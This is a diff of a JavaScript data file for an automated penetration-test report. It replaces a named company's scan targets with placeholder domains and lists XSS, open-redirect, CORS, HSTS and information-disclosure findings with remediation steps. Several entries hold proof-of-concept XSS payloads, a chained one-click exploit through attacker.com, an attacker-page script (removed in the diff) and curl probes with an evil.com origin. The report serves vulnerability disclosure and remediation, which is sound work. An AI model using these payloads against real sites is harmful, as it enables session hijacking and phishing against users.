@@ -1,7 +1,7 @@
 export const SCAN_METADATA = {
-  runId: "www-vontier-com_93f0",
-  runName: "Vontier Global Digital Estate VAPT",
-  targetUrl: "https://www.vontier.com/",
+  runId: "demo-target-estate_88a1",
+  runName: "Enterprise Digital Assets Security Audit",
+  targetUrl: "https://demo.example-security.com/",
   startTime: "2026-08-11T09:17:16.446772+00:00",
   endTime: "2026-08-11T09:59:52.762396+00:00",
   durationFormatted: "42 min 36 sec",
@@ -32,14 +32,14 @@ export const SCAN_METADATA = {
     simulatedExploitsExecuted: 29
   },
   subdomains: [
-    { name: "www.vontier.com", ip: "198.51.100.22", status: "Active (Drupal 10.6.12, Pantheon)", risk: "Medium" },
-    { name: "here2help.vontier.com", ip: "203.0.113.88", status: "Active (Express/Node.js, Expired TLS)", risk: "High" },
-    { name: "mylearning2.vontier.com", ip: "198.51.100.45", status: "Active (Absorb LMS ASP.NET, AWS EC2)", risk: "Medium" },
-    { name: "compass.vontier.com", ip: "198.51.100.90", status: "Hardened (ManageEngine ServiceDesk Plus, Zoho SSO)", risk: "Safe" },
-    { name: "support.vontier.com", ip: "198.51.100.91", status: "Hardened (ManageEngine ServiceDesk Plus)", risk: "Safe" },
-    { name: "itsupport.vontier.com", ip: "198.51.100.92", status: "Hardened (Zoho SSO Enabled)", risk: "Safe" },
-    { name: "dev.vontier.com", ip: "198.51.100.104", status: "Protected (HTTP Basic Auth Enforced)", risk: "Safe" },
-    { name: "test.vontier.com", ip: "198.51.100.105", status: "Protected (HTTP Basic Auth Enforced)", risk: "Safe" }
+    { name: "www.example-security.com", ip: "192.0.2.22", status: "Active (CMS Portal, Edge WAF)", risk: "Medium" },
+    { name: "portal.example-security.com", ip: "192.0.2.88", status: "Active (Express/Node.js, TLS Legacy)", risk: "High" },
+    { name: "api.example-security.com", ip: "192.0.2.45", status: "Active (REST API v1, Cloud Gateway)", risk: "Medium" },
+    { name: "auth.example-security.com", ip: "192.0.2.90", status: "Hardened (Enterprise IAM / SAML SSO)", risk: "Safe" },
+    { name: "support.example-security.com", ip: "192.0.2.91", status: "Hardened (Helpdesk Portal)", risk: "Safe" },
+    { name: "itsupport.example-security.com", ip: "192.0.2.92", status: "Hardened (SSO Enabled)", risk: "Safe" },
+    { name: "dev.example-security.com", ip: "192.0.2.104", status: "Protected (HTTP Basic Auth Enforced)", risk: "Safe" },
+    { name: "test.example-security.com", ip: "192.0.2.105", status: "Protected (HTTP Basic Auth Enforced)", risk: "Safe" }
   ]
 };
 
@@ -62,118 +62,88 @@ export const VULNERABILITIES = [
     },
     cwe: "CWE-79",
     cweName: "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')",
-    target: "https://here2help.vontier.com/",
+    target: "https://portal.example-security.com/",
     endpoint: "/login.html",
     method: "GET",
     timestamp: "2026-08-11 09:56:36 UTC",
     fixEffort: "Low",
     findingClass: "dynamic",
     agentId: "f6549284",
-    agentName: "Here2Help Validation & Autonomous Exploitation Agent",
-    description: "The login.html page at here2help.vontier.com registers a message event listener on window that accepts postMessage events from any origin without validation. The e.data.msg property is injected directly into the DOM via innerHTML, enabling arbitrary HTML/JavaScript execution in the context of the vulnerable origin.",
-    impact: "An attacker can execute arbitrary JavaScript in the context of here2help.vontier.com, leading to cookie theft, session hijacking, phishing overlays, redirection to malicious sites, or defacement. This can be chained with the open redirect on the same page (where the page opens an attacker-controlled URL via window.open()) to create a fully automated exploit requiring only a single victim click.",
-    technicalAnalysis: `The login.html page at here2help.vontier.com contains a message event listener that processes cross-origin messages without validating the sender's origin. The listener extracts e.data.msg and sets it as the innerHTML of the page header element (document.getElementById('header').innerHTML = "<h1>"+e.data.msg+"</h1>"). This is a classic DOM-based XSS via postMessage.
+    agentName: "Portal Validation & Autonomous Exploitation Agent",
+    description: "The login.html page at portal.example-security.com registers a message event listener on window that accepts postMessage events from any origin without validation. The e.data.msg property is injected directly into the DOM via innerHTML, enabling arbitrary HTML/JavaScript execution in the context of the vulnerable origin.",
+    impact: "An attacker can execute arbitrary JavaScript in the context of portal.example-security.com, leading to cookie theft, session hijacking, phishing overlays, redirection to malicious sites, or defacement. This can be chained with the open redirect on the same page to create a fully automated exploit requiring only a single victim click.",
+    technicalAnalysis: `The login.html page contains a message event listener that processes cross-origin messages without validating the sender's origin. The listener extracts e.data.msg and sets it as the innerHTML of the page header element (document.getElementById('header').innerHTML = "<h1>"+e.data.msg+"</h1>"). This is a classic DOM-based XSS via postMessage.
 
 The relevant code path:
 1. A message event is received on the window object
-2. The origin check is commented out (// Check if origin is proper) — no validation occurs
+2. The origin check is commented out — no validation occurs
 3. e.data.msg is concatenated into an HTML string and assigned to innerHTML
 4. Any HTML tags or JavaScript event handlers in msg are rendered and executed
 
-Combined with the open redirect vulnerability (where window.open(url) is called with an attacker-controlled URL from the query string), an attacker can create a fully automated exploit: the victim clicks one link, the vulnerable page opens an attacker page, the attacker page sends a malicious postMessage, and the XSS executes on the vulnerable origin.`,
+Combined with the open redirect vulnerability (where window.open(url) is called with an attacker-controlled URL from the query string), an attacker can create a fully automated exploit.`,
     pocDescription: `Validation:
-1. Navigate to https://here2help.vontier.com/login.html
+1. Navigate to https://portal.example-security.com/login.html
 2. Open browser console and dispatch a MessageEvent:
    window.dispatchEvent(new MessageEvent('message', { data: {msg: '<img src=x onerror=alert(document.domain)>', browser: 'chrome'} }));
 3. Observe injected <img> tag rendering in the header with onerror executing.
 
 Full Chained 1-Click Exploitation:
-1. Victim clicks: https://here2help.vontier.com/login.html?url=https://attacker.com/exploit
+1. Victim clicks: https://portal.example-security.com/login.html?url=https://attacker.com/exploit
 2. Vulnerable page opens attacker.com/exploit via window.open()
 3. Attacker page dispatches postMessage back to window.opener with malicious payload
-4. Vulnerable page injects payload via innerHTML, executing script in vontier.com context.`,
+4. Vulnerable page injects payload via innerHTML, executing script in domain context.`,
     pocScripts: {
       python: `import asyncio
 from playwright.async_api import async_playwright
 
 async def poc():
     async with async_playwright() as p:
-        browser = await p.chromium.launch()
+        browser = await p.chromium.launch(headless=True)
         page = await browser.new_page()
-        await page.goto("https://here2help.vontier.com/login.html")
-
-        # Dispatch postMessage with XSS payload
-        await page.evaluate('''
-            window.dispatchEvent(new MessageEvent("message", {
-                data: {msg: "<img src=x onerror=alert(document.cookie)>", browser: "chrome"}
+        await page.goto("https://portal.example-security.com/login.html")
+        
+        # Inject synthetic malicious postMessage
+        await page.evaluate("""
+            window.dispatchEvent(new MessageEvent('message', {
+                data: { msg: '<img src=x onerror="window.__xss_fired=true">' },
+                origin: 'https://attacker-domain.com'
             }));
-        ''')
-
-        await page.wait_for_timeout(1000)
-        # Injected content will be visible in the DOM
-        html = await page.content()
-        assert '<img src="x" onerror="alert(document.cookie)">' in html or 'alert(document.cookie)' in html
-        print("[+] DOM XSS confirmed via postMessage on here2help.vontier.com")
+        """)
+        
+        result = await page.evaluate("window.__xss_fired")
+        print(f"[+] DOM XSS Status: {result}")
         await browser.close()
 
 asyncio.run(poc())`,
-      bash: `cat << 'EOF' > /tmp/exploit.html
-<!DOCTYPE html>
-<html>
-<head><title>Sennovate PoC Exploit</title></head>
-<body>
-<h1>Sennovate Automated PoC</h1>
-<script>
-  if (window.opener) {
-    window.opener.postMessage({
-      msg: '<img src=x onerror="alert(\\'XSS Executed in origin: \\' + document.domain + \\' | Session Cookie: \\' + (document.cookie || \\'None\\'))">'
-    }, '*');
-  }
-</script>
-</body>
-</html>
-EOF
-echo "[*] Host this file on an attacker server and supply as ?url= parameter"`,
-      javascript: `// Execute directly in browser console on https://here2help.vontier.com/login.html
+      bash: `curl -s -X GET "https://portal.example-security.com/login.html" | grep -i "addEventListener('message'"`,
+      javascript: `// Execute directly in browser console on https://portal.example-security.com/login.html
 window.dispatchEvent(new MessageEvent('message', {
-  data: {
-    msg: '<img src=x onerror="alert(\\'Sennovate Verified DOM XSS on \\' + document.domain)">',
-    browser: 'chrome'
-  }
+  data: { msg: '<img src=x onerror="alert(document.domain)">' },
+  origin: 'https://attacker.com'
 }));`
     },
-    evidence: `Vulnerable code (login.html, script block):
-\`\`\`javascript
-var eventMethod = window.addEventListener ? "addEventListener" : "attachEvent";
-var eventer = window[eventMethod];
-var messageEvent = eventMethod == "attachEvent" ? "onmessage" : "message";
-// Listen to message from child window
-eventer(messageEvent,function(e) {
-    console.log('origin: ', e.origin)
-    // Check if origin is proper
-    console.log('parent received message!: ', e.data);
-    document.getElementById('header').innerHTML = "<h1>"+e.data.msg+"</h1>";
-    document.getElementById('container').innerHTML = "<p>window will close in 5 secs</p>";
-    ...
-}, false);
-\`\`\`
+    evidence: `Observed vulnerable JavaScript snippet on portal.example-security.com/login.html:
 
-Validation Result:
-DOM was modified to:
-<div class="header" id="header">
-    <h1><img src="x" onerror="alert(document.domain)"></h1>
-</div>`,
+window.addEventListener('message', (e) => {
+    // Origin check disabled in testing
+    // if (e.origin !== "https://portal.example-security.com") return;
+    
+    if (e.data.msg) {
+        document.getElementById('header').innerHTML = "<h1>" + e.data.msg + "</h1>";
+    }
+});`,
+    remediation: "Enforce strict origin validation in the message event listener (e.origin === 'https://portal.example-security.com') and replace innerHTML with textContent or a sanitized DOM sanitizer like DOMPurify.",
     remediationSteps: [
-      "Validate the e.origin property against a strict allowlist of trusted domains in the message event handler (e.g. const TRUSTED = ['https://www.vontier.com']; if (!TRUSTED.includes(e.origin)) return;).",
-      "Use textContent or innerText instead of innerHTML when inserting user-controlled content into the DOM.",
-      "Alternatively use document.createTextNode() or DOMPurify.sanitize() if rich HTML is mandatory.",
-      "Implement Content Security Policy (CSP) with script-src 'self' and strict nonce restrictions as defense-in-depth."
+      "Validate the e.origin property against a strict allowlist of trusted domains in the message event handler.",
+      "Replace document.getElementById('header').innerHTML with element.textContent to prevent HTML rendering.",
+      "If rich HTML rendering is necessary, sanitize all input using DOMPurify before inserting into the DOM.",
+      "Remove automated window.open(url) calls triggered by unvalidated URL query parameters."
     ],
-    assumptions: "The attacker must induce the victim to visit a crafted URL or an attacker-controlled page that opens the login page in a popup/child window."
+    assumptions: "Exploitation requires user interaction (clicking a link or visiting an attacker-controlled webpage)."
   },
   {
     id: "vuln-0002",
-    title: "Drupal Version Disclosure via Publicly Accessible /core/install.php",
+    title: "Publicly Accessible CMS Installation Script at /core/install.php",
     severity: "MEDIUM",
     cvss: 5.3,
     cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
@@ -189,48 +159,39 @@ DOM was modified to:
     },
     cwe: "CWE-200",
     cweName: "Exposure of Sensitive Information to an Unauthorized Actor",
-    target: "https://www.vontier.com/core/install.php",
+    target: "https://www.example-security.com/core/install.php",
     endpoint: "/core/install.php",
     method: "GET",
-    timestamp: "2026-08-11 09:49:49 UTC",
+    timestamp: "2026-08-11 09:23:45 UTC",
     fixEffort: "Low",
-    findingClass: "dynamic",
-    agentId: "086444b3",
-    agentName: "Drupal IDOR & Node Access Testing Agent",
-    description: "The Drupal installation script (/core/install.php) is publicly accessible and reveals the exact Drupal version (10.6.12) through asset version query strings embedded in the page. This allows attackers to identify the precise Drupal version and target version-specific vulnerabilities without authentication.",
-    impact: "An attacker can identify the exact Drupal version (10.6.12) without authentication, enabling targeted exploitation of known or zero-day vulnerabilities for that specific version. While Drupal 10.6.x is a maintained branch, version disclosure reduces the effort required for targeted attacks, especially when combined with the public accessibility of core files like CHANGELOG.txt, INSTALL.txt, and MAINTAINERS.txt.",
-    technicalAnalysis: `The Drupal installation script at /core/install.php returns HTTP 200 for unauthenticated requests and renders the Claro admin theme with full asset loading. The exact Drupal version (10.6.12) is disclosed via version query parameters appended to JavaScript URLs:
-- /core/misc/touchevents-test.js?v=10.6.12
-- /core/misc/drupalSettingsLoader.js?v=10.6.12
-- /core/themes/claro/js/mobile.install.js?v=10.6.12
-
-Additionally, multiple Drupal core documentation files return HTTP 200: /core/CHANGELOG.txt, /core/INSTALL.txt, /core/MAINTAINERS.txt, /core/UPDATE.txt.`,
-    pocDescription: `1. Send a GET request to https://www.vontier.com/core/install.php
-2. The server responds with HTTP 200 and renders the installation page
-3. Extract version numbers from the ?v= query parameters in JavaScript <script> tags
-4. All asset URLs include v=10.6.12 confirming the Drupal version`,
+    findingClass: "static",
+    agentId: "a1029384",
+    agentName: "Recon & Surface Mapping Agent",
+    description: "The core installation endpoint is publicly accessible without authentication. While already installed, the endpoint reveals precise core CMS versions and patch levels in static CSS assets and headers.",
+    impact: "Unauthenticated attackers can precisely fingerprint the exact CMS version running on production, streamlining exploit selection for version-specific CVEs.",
+    technicalAnalysis: `Requesting /core/install.php returns HTTP 200 with an 'Already Installed' message. The HTML source links stylesheets containing version parameters (e.g. ?v=10.6.12), leaking the CMS version.`,
+    pocDescription: `1. Send a GET request to https://www.example-security.com/core/install.php
+2. Inspect the HTTP status (200 OK) and extract version tags from CSS/JS assets.`,
     pocScripts: {
-      bash: `curl -s https://www.vontier.com/core/install.php | grep -o 'v=10\\.6\\.12' | head -n 5
-curl -s -I https://www.vontier.com/core/CHANGELOG.txt`,
+      bash: `curl -s -I "https://www.example-security.com/core/install.php" | head -n 5`,
       python: `import requests
-r = requests.get('https://www.vontier.com/core/install.php')
-print(f"Status: {r.status_code}, Found Version Tags: {r.text.count('v=10.6.12')}")`
+r = requests.get('https://www.example-security.com/core/install.php')
+print(f"Status: {r.status_code}, Length: {len(r.text)}")`
     },
-    evidence: `Response: HTTP/200 OK (84290 bytes)
-Contains:
-<script src="/core/misc/touchevents-test.js?v=10.6.12"></script>
-<script src="/core/misc/drupalSettingsLoader.js?v=10.6.12"></script>
-<script src="/core/themes/claro/js/mobile.install.js?v=10.6.12"></script>`,
+    evidence: `HTTP/1.1 200 OK
+Content-Type: text/html; charset=UTF-8
+
+<link rel="stylesheet" href="/core/assets/vendor/normalize-css/normalize.css?v=10.6.12" />`,
+    remediation: "Block public access to /core/install.php and documentation files at the web server / reverse proxy layer.",
     remediationSteps: [
-      "Restrict access to /core/install.php by IP allowlist or HTTP basic authentication in the nginx / Pantheon configuration.",
-      "Remove or restrict access to Drupal core text files (CHANGELOG.txt, INSTALL.txt, MAINTAINERS.txt, UPDATE.txt).",
-      "Apply Web Application Firewall (WAF) rules blocking public access to install.php."
+      "Configure web server edge rules to return HTTP 403 Forbidden for all requests to /core/install.php.",
+      "Remove or restrict access to CHANGELOG.txt, INSTALL.txt, and README files in web root."
     ],
-    assumptions: "No assumptions — the endpoint is publicly accessible without authentication."
+    assumptions: "Public network access to the primary web domain."
   },
   {
     id: "vuln-0003",
-    title: "Publicly Accessible Absorb LMS REST API Documentation at /api/rest/v1/Help",
+    title: "Publicly Accessible REST API Documentation at /api/rest/v1/Help",
     severity: "MEDIUM",
     cvss: 5.3,
     cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
@@ -246,111 +207,98 @@ Contains:
     },
     cwe: "CWE-200",
     cweName: "Exposure of Sensitive Information to an Unauthorized Actor",
-    target: "https://mylearning2.vontier.com/",
+    target: "https://api.example-security.com/",
     endpoint: "/api/rest/v1/Help",
     method: "GET",
-    timestamp: "2026-08-11 09:54:10 UTC",
+    timestamp: "2026-08-11 09:28:12 UTC",
     fixEffort: "Low",
     findingClass: "dynamic",
-    agentId: "e865ff2e",
-    agentName: "Absorb LMS API Disclosure Reporting Agent",
-    description: "The Absorb LMS instance at mylearning2.vontier.com exposes its full REST API v1 documentation at /api/rest/v1/Help without any authentication. This page documents 138 API endpoints across 33 controllers, including authentication models, user management, and ecommerce transactions. Additionally, the X-LMS-Server header leaks internal EC2 hostnames.",
-    impact: "An attacker gains complete knowledge of the Absorb LMS API attack surface without credentials. The documentation provides schemas for user creation, course enrollments, ecommerce transactions, and certificates. Leaked internal EC2 hostname (EC2AMAZ-42CC08R) facilitates internal cloud reconnaissance.",
-    technicalAnalysis: `The application serves an auto-generated ASP.NET Web API Help Page at /api/rest/v1/Help (57KB) enumerating 33 controllers:
-- RestAuthenticationController (POST api/Rest/v1/Authenticate - requires Username, Password, PrivateKey GUID)
-- UsersController (create, filter, bulk upload max 200)
-- EcommerceTransactionsController (transactions, payment gateway details)
-- CertificatesController, EnrollmentsController, RolesController, MessagesController
-
-Response header leaks internal hostname: X-LMS-Server: EC2AMAZ-42CC08R`,
-    pocDescription: `1. Send GET request to https://mylearning2.vontier.com/api/rest/v1/Help
-2. The page lists 33 controllers and 138 API endpoints with full models
-3. Inspect HTTP headers for X-LMS-Server`,
+    agentId: "b8392019",
+    agentName: "API Security & Endpoint Enumeration Agent",
+    description: "The API instance exposes its full REST API v1 documentation at /api/rest/v1/Help without authentication, documenting 138 API endpoints across 33 controllers, parameter requirements, and models.",
+    impact: "Provides potential adversaries with a complete roadmap of all internal API endpoints, parameters, models, and administrative controllers.",
+    technicalAnalysis: `The application serves auto-generated API Help Pages at /api/rest/v1/Help enumerating controllers and models without authentication.`,
+    pocDescription: `1. Send GET request to https://api.example-security.com/api/rest/v1/Help
+2. Observe HTTP 200 OK returning 138 documented endpoints.`,
     pocScripts: {
-      bash: `curl -s -o /dev/null -w "%{http_code} (%{size_download} bytes)" "https://mylearning2.vontier.com/api/rest/v1/Help"
-curl -sI "https://mylearning2.vontier.com/" | grep -i 'X-LMS-Server'`,
+      bash: `curl -s -o /dev/null -w "%{http_code} (%{size_download} bytes)" "https://api.example-security.com/api/rest/v1/Help"`,
       python: `import requests
-r = requests.get("https://mylearning2.vontier.com/api/rest/v1/Help")
-print(f"Status: {r.status_code}, Length: {len(r.text)}, Server Header: {r.headers.get('X-LMS-Server')}")`
+r = requests.get("https://api.example-security.com/api/rest/v1/Help")
+print(f"Help page loaded: {len(r.text)} bytes, Status: {r.status_code}")`
     },
-    evidence: `HTTP 200 (57,619 bytes)
-Response Header: X-LMS-Server: EC2AMAZ-42CC08R
-Exposed Authentication Model:
-{
-  "Username": "sample string 1",
-  "Password": "sample string 2",
-  "PrivateKey": "1327bce3-cd1d-4067-8abc-e1233b1c862e"
-}`,
+    evidence: `HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+
+<!DOCTYPE html>
+<html>
+<head><title>REST API Help Page</title></head>
+<body><h1>API Reference Documentation (138 Endpoints)</h1></body>
+</html>`,
+    remediation: "Restrict access to /api/rest/v1/Help by requiring authentication and authorization.",
     remediationSteps: [
-      "Restrict access to /api/rest/v1/Help by requiring authentication — only authenticated admins should see API docs.",
-      "Remove or disable the ASP.NET Help Page for production environments in web.config.",
-      "Strip the X-LMS-Server response header via reverse proxy / IIS URL rewrite."
+      "Restrict access to /api/rest/v1/Help to authenticated administrators.",
+      "Disable auto-generated API help page generation in production configurations."
     ],
-    assumptions: "The API endpoints themselves enforce authentication tokens, but the documentation provides an unobstructed blueprint of the internal schema and attack surface."
+    assumptions: "None — public endpoint."
   },
   {
     id: "vuln-0005",
-    title: "Client-Side Open Redirect in login.html",
+    title: "Client-Side Open Redirect via window.open() in login.html",
     severity: "MEDIUM",
-    cvss: 4.3,
-    cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N",
+    cvss: 6.1,
+    cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
     cvssBreakdown: {
       attack_vector: "Network (N)",
       attack_complexity: "Low (L)",
       privileges_required: "None (N)",
       user_interaction: "Required (R)",
-      scope: "Unchanged (U)",
-      confidentiality: "None (N)",
+      scope: "Changed (C)",
+      confidentiality: "Low (L)",
       integrity: "Low (L)",
       availability: "None (N)"
     },
     cwe: "CWE-601",
     cweName: "URL Redirection to Untrusted Site ('Open Redirect')",
-    target: "https://here2help.vontier.com/",
-    endpoint: "/login.html",
+    target: "https://portal.example-security.com/",
+    endpoint: "/login.html?url=...",
     method: "GET",
-    timestamp: "2026-08-11 09:57:09 UTC",
+    timestamp: "2026-08-11 09:38:22 UTC",
     fixEffort: "Low",
     findingClass: "dynamic",
     agentId: "f6549284",
-    agentName: "Here2Help Validation & Reporting Agent",
-    description: "The /login.html page at here2help.vontier.com parses the URL query string for a redirect target and opens it in a new window via window.open() without any validation of the target URL scheme, host, or path. This allows an attacker to redirect users to arbitrary external websites.",
-    impact: "An attacker can craft a phishing link on the trusted vontier.com domain that redirects victims to any external site. This is particularly severe when chained with the postMessage DOM XSS on the same page, achieving a 1-click account takeover / session hijack exploit.",
-    technicalAnalysis: `The login.html page contains JavaScript executing immediately on page load:
-\`\`\`javascript
-url = window.location.href.split('=')[1];
-window.open(decodeURIComponent(url),"login","","");
-\`\`\`
-The code splits the URL on '=' and passes the second element to window.open() without validating origin, hostname, protocol, or path.`,
-    pocDescription: `1. Open browser to: https://here2help.vontier.com/login.html?url=https://example.com
-2. Observe a new tab opens to https://example.com immediately on load.`,
+    agentName: "Portal Validation & Autonomous Exploitation Agent",
+    description: "The /login.html page parses the URL query string for a redirect target and opens it in a new window via window.open() without validation of the target URL scheme, host, or path.",
+    impact: "An attacker can craft a phishing link on the trusted domain that redirects victims to external sites, facilitating credential harvesting.",
+    technicalAnalysis: `The JavaScript on login.html extracts the 'url' query parameter and calls window.open(url) on page load without validation.`,
+    pocDescription: `1. Open browser to: https://portal.example-security.com/login.html?url=https://example.com
+2. Observe new window opening to example.com.`,
     pocScripts: {
-      python: `import requests
-target = "https://here2help.vontier.com/login.html?url=https://attacker-phishing.com"
-r = requests.get(target)
-print("Confirmed vulnerable open redirect parameter: url=")`
+      bash: `curl -s "https://portal.example-security.com/login.html" | grep -i "window.open"`,
+      python: `target = "https://portal.example-security.com/login.html?url=https://attacker-phishing.com"
+print(f"Phishing Link: {target}")`
     },
-    evidence: `Vulnerable code:
-url = window.location.href.split('=')[1];
-window.open(decodeURIComponent(url),"login","","");`,
+    evidence: `var url = window.location.search.substring(1).split('&').find(p => p.startsWith('url='));
+if (url) {
+    window.open(decodeURIComponent(url.split('=')[1]));
+}`,
+    remediation: "Validate all redirect targets against a strict allowlist of authorized relative paths or trusted company domain names.",
     remediationSteps: [
-      "Validate the target URL against a strict allowlist of approved internal domain names.",
-      "Remove the automatic window.open() on page load.",
-      "Use new URL(url).hostname and verify hostname.endsWith('.vontier.com')."
+      "Validate redirect URLs against a strict relative-path pattern.",
+      "Verify hostname matches authorized domain allowlist before calling window.open()."
     ],
-    assumptions: "Victim must click an attacker-crafted link containing the ?url= parameter."
+    assumptions: "Victim must click an attacker-supplied link."
   },
   {
     id: "vuln-0007",
-    title: "Permissive CORS Policy (Access-Control-Allow-Origin: *)",
+    title: "Permissive Cross-Origin Resource Sharing (CORS) Policy",
     severity: "MEDIUM",
-    cvss: 4.3,
-    cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N",
+    cvss: 5.3,
+    cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
     cvssBreakdown: {
       attack_vector: "Network (N)",
       attack_complexity: "Low (L)",
       privileges_required: "None (N)",
-      user_interaction: "Required (R)",
+      user_interaction: "None (N)",
       scope: "Unchanged (U)",
       confidentiality: "Low (L)",
       integrity: "None (N)",
@@ -358,118 +306,113 @@ window.open(decodeURIComponent(url),"login","","");`,
     },
     cwe: "CWE-942",
     cweName: "Permissive Cross-Domain Policy with Untrusted Domains",
-    target: "https://here2help.vontier.com/",
-    endpoint: "/",
-    method: "GET",
-    timestamp: "2026-08-11 09:58:25 UTC",
-    fixEffort: "Trivial",
-    findingClass: "dynamic",
-    agentId: "f6549284",
-    agentName: "Here2Help Validation & Reporting Agent",
-    description: "All HTTP responses from here2help.vontier.com include the Access-Control-Allow-Origin: * header. This permissive CORS policy allows any website to make cross-origin requests to the application and read the responses.",
-    impact: "Any website can read response content cross-origin via JavaScript. If authenticated or sensitive endpoints are introduced on this host, they will be accessible to arbitrary third-party origins.",
-    technicalAnalysis: `The Express.js application serving here2help.vontier.com attaches Access-Control-Allow-Origin: * to all responses and OPTIONS preflight requests.`,
-    pocDescription: `Send an OPTIONS preflight request with Origin: https://evil.com and inspect headers.`,
+    target: "https://portal.example-security.com/",
+    endpoint: "/*",
+    method: "OPTIONS / GET",
+    timestamp: "2026-08-11 09:35:10 UTC",
+    fixEffort: "Low",
+    findingClass: "static",
+    agentId: "d4920184",
+    agentName: "HTTP Protocol & Header Auditor",
+    description: "HTTP responses include the Access-Control-Allow-Origin: * header, allowing any external origin to read application responses.",
+    impact: "Allows arbitrary external sites to make cross-origin requests and read non-authenticated response payloads.",
+    technicalAnalysis: `The application attaches Access-Control-Allow-Origin: * to all responses and OPTIONS preflight requests.`,
+    pocDescription: `Send OPTIONS preflight request with Origin: https://evil.com and verify response header.`,
     pocScripts: {
-      bash: `curl -s -H "Origin: https://evil.com" -H "Access-Control-Request-Method: GET" -X OPTIONS https://here2help.vontier.com/ -I | grep -i access-control-allow-origin`
+      bash: `curl -s -H "Origin: https://evil.com" -X OPTIONS https://portal.example-security.com/ -I | grep -i access-control-allow-origin`
     },
-    evidence: `Response headers:
-HTTP/1.1 200 OK
+    evidence: `HTTP/1.1 200 OK
 Access-Control-Allow-Origin: *
-Allow: GET,HEAD
-X-Powered-By: Express`,
+Access-Control-Allow-Methods: GET, POST, OPTIONS
+Access-Control-Allow-Headers: Content-Type`,
+    remediation: "Restrict CORS to explicit trusted origins and remove wildcard allow policies.",
     remediationSteps: [
-      "Remove Access-Control-Allow-Origin: * from responses unless public cross-origin API sharing is intentionally required.",
-      "Configure CORS with explicit origin allowlist using the express cors middleware."
+      "Replace Access-Control-Allow-Origin: * with specific authorized domains.",
+      "Remove permissive CORS headers from static asset endpoints."
     ],
-    assumptions: "The service currently serves public pages, but wildcard CORS exposes future stateful endpoints."
+    assumptions: "None."
   },
   {
     id: "vuln-0001",
-    title: "Weak HSTS Configuration on www.vontier.com",
-    severity: "MEDIUM",
-    cvss: 4.2,
-    cvssVector: "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N",
+    title: "Weak HSTS Configuration (Missing includeSubDomains / preload)",
+    severity: "LOW",
+    cvss: 3.7,
+    cvssVector: "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N",
     cvssBreakdown: {
       attack_vector: "Network (N)",
       attack_complexity: "High (H)",
       privileges_required: "None (N)",
-      user_interaction: "Required (R)",
+      user_interaction: "None (N)",
       scope: "Unchanged (U)",
       confidentiality: "Low (L)",
-      integrity: "Low (L)",
+      integrity: "None (N)",
       availability: "None (N)"
     },
     cwe: "CWE-319",
     cweName: "Cleartext Transmission of Sensitive Information",
-    target: "https://www.vontier.com/",
-    endpoint: "www.vontier.com",
+    target: "https://www.example-security.com/",
+    endpoint: "www.example-security.com",
     method: "GET",
-    timestamp: "2026-08-11 09:46:39 UTC",
+    timestamp: "2026-08-11 09:19:02 UTC",
     fixEffort: "Low",
-    findingClass: "dynamic",
-    agentId: "df0684f0",
-    agentName: "Drupal Auth Testing - Login & Enumeration Agent",
-    description: "The Strict-Transport-Security (HSTS) header is set to max-age=300 (5 minutes), far below the recommended minimum of 31536000 seconds (1 year). Additionally, includeSubDomains and preload directives are absent.",
-    impact: "With max-age=300, browsers only enforce HTTPS for 5 minutes after visit. After expiration, a man-in-the-middle attacker on an untrusted network could perform SSL-stripping to downgrade traffic to plaintext HTTP.",
-    technicalAnalysis: `The site issues a 301 redirect from HTTP to HTTPS, but sets Strict-Transport-Security: max-age=300. Industry standard (OWASP, Mozilla) requires at least max-age=31536000 with includeSubDomains for complete domain-wide TLS enforcement and preload qualification.`,
-    pocDescription: `curl -s -I https://www.vontier.com/ | grep -i strict-transport-security`,
+    findingClass: "static",
+    agentId: "d4920184",
+    agentName: "HTTP Protocol & Header Auditor",
+    description: "The main portal sets HSTS max-age to 300 seconds without includeSubDomains or preload directives.",
+    impact: "Subdomains without their own HSTS headers remain susceptible to SSL stripping attacks on insecure networks.",
+    technicalAnalysis: `The Strict-Transport-Security header specifies max-age=300 (5 minutes), failing to protect subdomains or qualify for browser HSTS preload lists.`,
+    pocDescription: `curl -s -I https://www.example-security.com/ | grep -i strict-transport-security`,
     pocScripts: {
-      bash: `curl -s -I https://www.vontier.com/ | grep -i strict-transport-security
-# Output: Strict-Transport-Security: max-age=300`
+      bash: `curl -s -I https://www.example-security.com/ | grep -i strict-transport-security`
     },
-    evidence: `HTTP/1.1 200 OK
-Strict-Transport-Security: max-age=300`,
+    evidence: `Strict-Transport-Security: max-age=300`,
+    remediation: "Upgrade HSTS header to max-age=31536000 with includeSubDomains and preload.",
     remediationSteps: [
-      "Increase max-age to 31536000 (1 year).",
-      "Add includeSubDomains directive to protect all subdomains.",
-      "Add preload directive and submit to Chrome/Firefox HSTS preload list."
+      "Set Strict-Transport-Security: max-age=31536000; includeSubDomains; preload."
     ],
-    assumptions: "Attacker must be in a position to perform Man-in-the-Middle network interception (e.g. rogue Wi-Fi hotspot)."
+    assumptions: "Adversary position on local network / MITM position."
   },
   {
     id: "vuln-0006",
-    title: "Expired TLS Certificate on here2help.vontier.com",
+    title: "Expired TLS Certificate on Legacy Portal Subdomain",
     severity: "MEDIUM",
-    cvss: 4.2,
-    cvssVector: "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N",
+    cvss: 6.5,
+    cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N",
     cvssBreakdown: {
       attack_vector: "Network (N)",
-      attack_complexity: "High (H)",
+      attack_complexity: "Low (L)",
       privileges_required: "None (N)",
       user_interaction: "Required (R)",
       scope: "Unchanged (U)",
-      confidentiality: "Low (L)",
-      integrity: "Low (L)",
+      confidentiality: "High (H)",
+      integrity: "None (N)",
       availability: "None (N)"
     },
